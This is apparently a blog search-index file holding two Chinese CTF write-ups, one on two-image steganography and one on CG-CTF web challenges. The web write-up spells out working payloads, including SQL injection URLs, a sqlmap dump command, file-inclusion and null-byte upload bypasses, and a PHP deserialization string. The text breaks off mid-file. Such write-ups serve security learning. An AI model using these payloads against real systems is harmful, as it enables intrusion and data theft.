<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[一道MISC带你走入双图隐写]]></title>
    <url>%2F2018%2F11%2F21%2F%E4%B8%80%E9%81%93MISC%E5%B8%A6%E4%BD%A0%E8%B5%B0%E5%85%A5%E5%8F%8C%E5%9B%BE%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[前言隐写术是什么？顾名思义是隐藏信息书写的技术，是信息隐藏技术的一种。 隐写术中有一个很经典的模型，叫做Simmons模型，也是常说的囚犯问题。 Alice 和 Bob 分属两个牢房，为了合谋越狱需要进行通信，而通信的信件必须经过中间看守人Wendy的审阅。Wendy可以阅读信件的内容，而且阅读后可以决定是否传送这封信件。这时，对信息进行加密不可取，因为看守人会阅读传送的信息的内容，加密后的信息大概率会引起看守人的怀疑，看守人不但可以选择不发送，还可以以此为依据对两名犯人进行调查。 因此需要一种对通信过程隐藏的手段 ，即隐写术。简单概括，隐写术试图隐藏的是通信事件本身。 推荐一本我在某邮图书馆翻到的书 《数据隐藏技术解密》——[美]Michael Raggo 一道双图隐写的CTF题做题之前，我对一些常见文件格式分析和常用工具进行了一些了解，这篇文章不进行赘述了，有兴趣的可以自己了解一下，或者我以后闲下来可能会整理出来？？这里只推荐一篇 png文件结构的博客 题目图片链接：https://pan.baidu.com/s/1Ztx0o_-V8XhzBzvSSothtg 提取码：qdtf 先用Binwalk分析文件 发现藏了两张图片，用foremost分离 在kali中使用compare比较两个图片并生成一张比较图会发现左下角有一条红线，红线处就是存在不同的地方，这种情况一般是双图像运算。 compare生成比较文件命令 compare 1.png 2.png output.png 使用Stegsolve打开一个图片，然后用Analyse选项的Image Combiner功能再添加一个图片进行异或操作，这样会把两个图片相同的部分变为0，不同的部分保留。然后保存异或运算后生成的bmp图片，用WinHex打开这个图片会发现这个文件中大部分都为0，不为0的部分就是两张图片不相同的区间，也就是之前红线处图片的差异。 记录不为0部分的偏移量区间，把原来分离出来的两个图片文用画图板另存为bmp格式，因为XOR异或出来的图片格式为BMP需要使用相同格式的图片寻找差异处。 用winhex打开两个图片，分别找到对应的偏移量区间如下 发现其中的差异是第二张图片中一些字节被替换成了00或01，找一下规律发现是每隔两个字节替换一次（每三个Hex的第一个Hex都是00或01，其实每三个Hex代表一个RGB通道，也就是信息隐藏在R通道中），分析这些0和1连接到一起可能会产生二进制信息，但是又不能挨个打出来吧。先把这一段十六进制数据复制下来，找到规律利用python切片连接这些01。 这里是将一串binary写入R通道中的时候，0变成了00， 1变成了01。 得到的01数据长度len()一下发现是8的倍数，这时可以直接使用JPK工具格式化二进制数据并转换成Ascii码 得到flag 也可以自己写一个脚本来处理这串01序列 1.py 12345678import sysstr=&quot;0100100101010011010001110111101101000101001101000111001101011001010111110101001101110100010001010110011100110100011011100011000001100111010100100011010001110000010010000111100101111101&quot;i = 0while i&lt;len(str): sys.stdout.write(chr(int(str[i:i+8],2))) i+=8print 走进双图隐写双图隐写泛指CTF竞赛中所有以两张图片为解题线索的题型，这里的两张图片可以指给出一张图片然后隐藏了另一张图片，也可以指直接给出了两张图片但是需要两张图片结合分析来提取出隐藏信息。 双图隐写原理： 图像格式拼接 不同的图像格式存在不同的文件头和文件尾 图层叠加 图像由图图叠加而成，图层由像素组成，每一张图层可以理解为一层透明的“玻璃”，它们各自包含独立的内容，可以理解为将各个图层从上到下依次重叠，然后俯视观测第一张图层，各个图层显示的叠加效果为图像最后的显示效果。 图像运算 实质上是像素的运算，两张图像相加，实质上是两张图像对应位置的像素相加 这道题的考点是双图像运算，这种题目的特征为binwalk发现的两张图片分离后看起来完全相同，处理时可能对两张图片进行异或运算，两张图片的差异数据中存在隐藏信息。 写在后面最近感觉自己也没学啥，看了看隐写术的常见套路，回头再把那本书看完就圆满了。 等周末打打看NJUPTCTF就滚回去学python和java了。 不想写了，这篇博客就草草收尾了。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CG-CTF web篇零基础指南]]></title>
    <url>%2F2018%2F11%2F14%2FCG-CTF-web%E7%AF%87%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[前言用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！ 南邮CG CTF web传送门 writeup1.签到题直接看源代码就可以看到flag了 2.md5 collisionphp源码 12345678910$md51 = md5(&apos;QNKCDZO&apos;);$a = @$_GET[&apos;a&apos;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; php弱类型的利用，这道题满常见的，需要传入一个参数a不等于 ‘QNKCDZO’，但是md5加密后的值与 ‘QNKCDZO’ md5加密后的松散比较相等。md5(‘QNKCDZO’)=’0e830400451993494058024219903391’ ，而PHP在处理哈希字符串时，会利用!=或==来对哈希值进行比较，它把每一个以0E开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以0E开头的，那么PHP将会认为他们相同，都是0。 所以给 a 传入一个 md5 加密后也为 0e 开头的字符串即可，这样的字符串一搜一大把了 这里我传了 ?a=s878926199a 拿到flag tips： 1、在PHP中，@被称为错误控制操作符，前置@符号的表达式产生的任何错误都将被忽略。 2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位或16位十六进制串，由[0-9a-e]组成。 3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换而后者不会。 3.签到2 这道题是前端对输入框长度的限制，F12查看页面代码发现 maxlength=&quot;10&quot; 而需要输入的口令 “zhimakaimen为11位，直接在查看器更改10为任意大于等于11的数再输入口令即可。 4.这题不是web打开题目地址发现一个可爱的动图，把图片下载到本地，用文本编辑器或winHex打开(记事本就可以了)，Ctrl + F 查找flag，在末尾。 5.层层递进又是一道查看源代码的题，在\&lt;iframe>标签中跟着链接依次访问嵌套的SO.html -&gt; S0.html-&gt;SO.htm -&gt;S0.htm-&gt;404.html ，在404.html注释中找到flag 6.AAencodejavascript aaencode 这道题链接坏了，在南邮旧ctf平台找到了这道题的链接 打开题目是乱码，用火狐Unicode编码后是颜文字 提示是js aaencode，是一种把js代码编码成颜文字的编码方式，直接把这段颜文字拉到控制台执行，发现有错误 错误提示：ωﾟﾉ is not defined ，即 ωﾟﾉ 这个变量没有被定义，那我们先在控制台定义这个变量，再执行代码 拿到flag 7.单身二十年访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包repeater重放一下拿到flag。 8.php decode123456789&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;); 应该是一道编码题，但是可以直接在代码在线运行的网站允许一下这段php代码，就可以跑出flag了 9.文件包含使用php的filter协议读取index.php payload：http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php 显示了base64编码后的index.php源码，这种方法经常用得到，把得到的编码在在线网站解码得到源码 12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125; $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 查看源码得到flag 更多php伪协议实现命令执行的姿势可见 传送门 10.单身一百年也没用这道题的flag藏在了响应信息中 11.Download~!这道题链接找不到了，提示是别下音乐 看网上的解题是进去之后会看到两个下载音乐的链接，查看源代码发现星星点灯的下载链接为download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=，经过了base64加密，解码内容为xingxingdiandeng.mp3。 尝试下载其他页面如index.php download.php及它们base64加密后的页面，发现download.php可以下载 打开下载的download文件，发现首先对url参数进行了base64解码，并且只有四个文件能够正常下载，否则提示Access Forbidden！下载hereiskey.php，得到flag 。 12.COOKIETIP: 0==not F12看网络，把请求头中的Cookie：Login=0 改成 Login=1 重新发包后在响应主体中拿到flag 13.MYSQL根据提示查看robots.txt （robots.txt是一个告诉爬虫那些东西不能爬的文件，在ctf中是一个经常存在的有提示信息的文件） 123456789101112131415TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。 这里有两种做法 1.传入id=1024.1，intval()函数会把1024.1取整为1024 2.利用intval()函数的特性：只识别到非数字的那一位，而松散比较的强制类型转换会把e当作科学记数法的一部分处理，即科传入id=1024e1 14.GBK Injection 把id参数的值改成2，3得到两个提示信息：gbk_sql_injection 和 the fourth table 在参数后面加个单引号，发现sql语句转译成了your sql:select id,title from news where id = &#39;3\&#39;&#39; 判断存在GBK宽字节注入， flag在第四个表中，用sqlmap一下就跑出来了哈哈 payload： python2 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 -T ctf4 -C flag --dump 手工注入一下： 先介绍宽字节注入的原理如下， 当传入 id=1’ 时，单引号会被转义符(反斜线)转义，导致id参数无法逃逸单引号的包围。由于MySQL执行查询时会跳过畸形字符，当输入参数 id=1%df’ 时，参数会经过转义和url编码变为 id=1%df%5c%27，%5c 是反斜杠的url编码，%27 是单引号的url编码。而在GBK编码中，%df%5c是繁体字”連 “，这时单引号成功逃逸。 1234567891011121314151617181920#第一步 判断是否存在注入http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 和http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27--+ 返回结果相同。#第二步 使用union查询数据库名先用 chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 order by 2--+ 判断有两列再用 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 union select null,database()--+得到数据库名为&apos;sae-chinalover&apos;#第三步 查询&apos;sae-chinalover&apos;数据库的第四张表名http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,table_name from information_schema.tables where table_schema=database() limit 3,1--+得到第四张表表名为&apos;ctf4&apos;tips:1.MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。2.limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。#第四步 从表&apos;ctf4&apos;中查询flaghttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,flag from ctf4--+这里的列名&apos;flag&apos;是猜的，也可以从上一步中的information_schema数据库中查询列名，关于列名的信息在information_schema.columns表中的column_name字段。 15./x00这道题学到了点东西！ 12345678910view-source: if (isset ($_GET[&apos;nctf&apos;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; &#125; 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos()找到#biubiubiu 有两种方法： 1.ereg()正则函数会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 所以提交nctf=1%00%23biubiubiu，即可拿到flag 2.ereg和strpos函数传入数组后返回的都是NULL 所以提交nctf[]=，拿到flag tips: 由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子，还有很多可以自行百度。 16.bypass again依旧是弱类型 1234567if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])if (md5($_GET[&apos;a&apos;]) == md5($_GET[&apos;b&apos;]))die(&apos;Flag: &apos;.$flag);elseprint &apos;Wrong.&apos;;&#125; 和第二题原理一样 payload：http://chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a 17.变量覆盖 source.php查看源代码，关键php代码整理后如下 12345678910111213141516&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;?&gt;&lt;?php extract($_POST); if ($pass == $thepassword_123) &#123;?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt;&lt;?php &#125;?&gt;&lt;?php &#125;?&gt; extract() 函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。 该函数返回成功导入到符号表中的变量数目。 所以这道题给pass和thepassword_123用post传一个相同的值即可 18.php是世界上最好的语言这道题链接也挂了，我没答上 参考一下网上的writeup吧 index.txt核心代码如下 1234567891011&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125; eregi()函数判断id是否为hackerDJ，大小写敏感。网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串。 因为url在传入后台时会自动先进行一次url解码，所以这里需要二次编码 hackerDJurl编码后为%68%61%63%6b%65%72%44%4a 二次编码后为%2568%2561%2563%256b%2565%2572%2544%254a 其中%25是%的url编码 19.伪装者提示管理系统只能在本地登陆 改了Referer: 127.0.0.1和X-Forwarded-For: 127.0.0.1都没有成功 看网上的解释好像是服务端代码有问题 XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务 20.header链接挂了，flag应该就在数据包的头信息中 21.上传绕过介绍一下文件截断绕过攻击 1.文件系统0x00截断 在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。 （0x00是16进制值，不可见。） 2.PHP%00截断 原理与15题类似，使用方法与文件系统0x00截断相同 源码为 12345678&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt; 后台应该是dir和file连接 先尝试上传一个1.jpg文件 提示上传php文件才行，那上传一个1.php试试 提示不被允许的文件类型，使用burp抓一个上传文件的包，尝试filename处截断，发现上传仍然失败。 尝试在目录处截断，成功。 这个地方尝试截断了好几次，发现直接在重放的Raw中改目录名为”/uploads/1.php0x00”或”/uploads/1.php%00”都没有截断成功，最后是要在Hex中直接改为十六进制的00。 我的做法是先在Raw中现把filename的值“1.php”改为”1.php.jpg”，然后把dir路径改为 /uploads/1.php+ 我们知道”+”的十六进制值为2b，所以再去Hex中找到+对应的位置把”2b”改成”00”再重新发包。 传送门：其他文件上传绕过姿势 22.SQL注入1直接看源码 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; 会对传入的参数两端去空格，其中sql构建语句为：select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;) 直接post个user闭合单引号和括号，再随便传个pass让它存在就可以了。 23.pass check12345678910111213$pass=@$_POST[&apos;pass&apos;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; 之前提过的php弱类型，strcmp函数在比较失败，即传入数组时会返回null 24.起名字真难123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&apos;1&apos;); $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &apos;54975581388&apos;;&#125;$flag=&apos;*******&apos;;if(noother_says_correct($_GET[&apos;key&apos;])) echo $flag;else echo &apos;access denied&apos;;?&gt; int ord ( string $string )函数：返回字符串 string 第一个字符的 ASCII 码值 分析一下代码，这道题需要传入的key参数中不含有1-9的数字但又等于54975581388，考虑编码解决，发现hex(54975581388)刚好等于0xccccccccc 因此访问url：http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 就可以拿到flag辣 25.密码重置tip：重置管理员账号：admin 的密码 burp抓个包看看 放到repeater中把post的user参数改成admin，发现url中get还传了个user1参数，看着像base64编码的，解码发现是ctfuser，所以考虑把user1参数修改为admin经过base64编码后的内容。 26.php反序列化（暂时无法做）123456789101112131415161718192021222324&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET[&apos;pass&apos;])) &#123; $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;?&gt; 反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同 对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了 在本地写一段代码 12345678910111213&lt;?phpclass just4fun&#123; var $secret; var $enter ;&#125;$f=new just4fun();$f-&gt;enter=&amp;$f-&gt;secret;$sf=serialize($f);print_r($sf);$usf=unserialize($sf);echo &apos;&lt;br/&gt;&apos;;print_r($usf); 输出如下： O:8:&quot;just4fun&quot;:2:{s:6:&quot;secret&quot;;N;s:5:&quot;enter&quot;;R:2;} 所以访问 http://localhost/cgctf2.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;} php反序列化详细的内容我过几天打完ctf去学php代码审计的时候会整理新的博客的！ 27.SQL InjectionTIP:反斜杠可以用来转义 仔细查看相关函数的用法 查看源代码 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;--&gt; sql语句：SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;; 观察clean函数中的返回值经过htmlentities()函数过滤，这个字符将字符转换为 HTML 转义字符 ，第二个参数如果没有默认只转换双引号，但参数值为ENT_QUOTES时查询文档得知既转换双引号又转换单引号。 我们最终目标是平衡单引号，可是经过这个函数过滤我们无法输入单引号，只能想怎么消灭原来的单引号。 构造payload：?username=\&amp;password= or 1#使得查询语句如下： 12345678SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; or 1%23&apos;即SELECT * FROM users WHERE name=&apos;\&apos; AND pass=&apos; 『 [name]的值为 [&apos; AND pass=]，单引号被转义了，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真 』 %23&apos; 『 %23是#的url编码，注释掉多余的单引号 』即select * from users where false or 1 28.综合题打开后发现是一串看不懂的代码，google一下是jsfuck编码，在线解码网站 直接拉到控制台执行，得到 1bc29b36f623ba82aaf6724fd3b16718.php 打开这个网页得到新的提示 根据提示查看http头信息 上网搜了一下，发现这是一个linux下保存历史命令的文件，默认保存在/root/.bash_history .bash_history详解：https://yq.aliyun.com/ziliao/75352 所以尝试打开该目录下这个文件 url：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到新的提示 这是一个linux解压缩的命令，访问新的url：http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip可以下载这个压缩文件，用文本编辑器打开该文件得到flag 29.system（暂时无法做）pass 30.SQL注入2tip：主要考察union查询 查看关键源代码 12345678910111213141516&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; strcasecmp(str1, str2)：两个字符串相等则返回0 观察一下条件语句 ($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])) mysql_fetch_array() 函数返回的关联数组中键为字段名 构造payload：post一下数据 12user=&apos; union select &apos;bb23bab64934efa2a4e1666109467f43&apos;#&amp;pass=xiangfeng//&apos;bb23bab64934efa2a4e1666109467f43&apos;是&apos;xiangfeng&apos;的MD5值 先用一个单引号把user闭合，然后联合查询xiangfeng的md5值，这样返回的关联数组中pw建的值就是’bb23bab64934efa2a4e1666109467f43’。 31.综合题2见另一篇博客：传送门 32.密码重置21234TIPS:1.管理员邮箱观察一下就可以找到2.linux下一般使用vi编辑器，并且异常退出会留下备份文件3.弱类型bypass 查看网页源代码得到管理员邮箱： 根据提示，学到一个新知识是非正常关闭vi编辑器时会生成一个.swp文件 查看.index.php.swp和.submit.php.swp文件 能打开.submit.php.swp文件，关键代码如下 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&apos;fail&apos;); if($token!=&apos;0&apos;) die(&apos;fail&apos;); $sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;; $r = mysql_query($sql) or die(&apos;db error&apos;); $r = mysql_fetch_assoc($r); $r = $r[&apos;num&apos;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125;&#125; 要求token长度为10且token!=0为假，有两种绕过方法，第一种传入token=0000000000绕过，第二种利用弱类型（含有数字内容的字符串也会被转换类型）传入token=0e12345678绕过。 33.file_get_contents1234&lt;!--$file = $_GET[&apos;file&apos;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; file_get_contents() 函数将整个文件读入一个字符串 这里使用第九题中提到的php伪协议之一：”php://input”可以访问请求的原始数据的只读流,，将post请求中的数据作为PHP代码执行。 34.变量覆盖代码审计类题目 123456&lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == &quot;meizijiu233&quot;)&#123; echo $flag;&#125;--&gt; foreach 遍历数组或对象，它会把当前单元的键名也会在每次循环中被赋给变量 $key，值赋给变量$value $$ 的意思参考可变变量 35. HateIT这道题太难了！我是跟着网上的writeup一步一步复现的，不然自己根本想不到。 先了解一下web中敏感文件泄露的原因和方法：传送门 扫描发现robots.txt，admin.php，upload/upload.php，.git/ upload/uploa.php不能直接访问，估计是看cookie的 使用 dvcs-ripper 工具将 git 文件下载下来，发现只有一个README.md 提示有历史版本，看来得恢复文件，通过git log查看记录 通过git reset回滚版本 拿到了三个通过扩展加密的 php文件和一个txt文件，opcode.txt有index.php，class.php，func.php的 opcode 代码，可以解密这三个php文件。 看一下robots.txt suenc.so 是一个加密扩展文件，可以下载下来，用来解密admin.php 。 因为我很菜还不会逆向，所以直接贴网上师傅们解密出来的代码了 index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php if(!isset($_SESSION)) &#123; session_start(); &#125; echo &apos;...这部分前端内容我就省略不贴了...&apos;; include_once(&apos;func.php&apos;); if(isset($_GET[&apos;username&apos;])) &#123; $username = $_GET[&apos;username&apos;]; $md5 = md5(get_identify().$username); $admin = 0; $token = encrypt($username.&apos;|&apos;.$admin.&apos;|&apos;.$md5); $_SESSION[&apos;sign&apos;] = $md5; $_SESSION[&apos;token&apos;] = $token; &#125; showImage(); if(isset($_GET[&apos;token&apos;]) &amp;&amp; isset($_GET[&apos;sign&apos;])) &#123; $token = $_GET[&apos;token&apos;]; $sign = $_GET[&apos;sign&apos;]; echo &apos;sign : &apos;.$sign.&apos;&lt;br&gt;&apos;; echo &apos;token: &apos;.$token.&apos;&lt;br&gt;&apos;; $info = explode(&apos;|&apos;, decrypt($token)); echo decrypt($token); var_dump($info); if(count($info) == 3) &#123; if(md5(get_identify().$info[0]) == $info[2]) &#123; $sign = $info[1]; $admin = $info[1]; &#125;else&#123; $admin = $info[1]; &#125; &#125; &#125;else&#123; if(isset($_SESSION[&apos;token&apos;]) &amp;&amp; isset($_SESSION[&apos;sign&apos;])) &#123; echo &apos;sign : &apos;.$_SESSION[&apos;sign&apos;].&apos;&lt;br&gt;&apos;; echo &apos;token: &apos;.$_SESSION[&apos;token&apos;].&apos;&lt;br&gt;&apos;; $token = $_SESSION[&apos;token&apos;]; $sign = $_SESSION[&apos;sign&apos;]; $info = explode(&apos;|&apos;, decrypt($token)); if(count($info) == 3) &#123; if(md5(get_identify().$info[0]) == $info[2]) &#123; $sign = $info[1]; $admin = $info[1]; &#125;else&#123; $admin = $info[1]; &#125; echo &apos;&lt;br&gt;&apos;.$admin; &#125; &#125; &#125; if(isset($admin) &amp;&amp; $admin == 3) &#123; $_SESSION[&apos;auth&apos;] = &apos;admin&apos;; echo &quot;&lt;a href=&apos;admin.php&apos;&gt;Admin&lt;/a&gt;&quot;; &#125; func.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2018/2/2 * Time: 下午9:25 */include 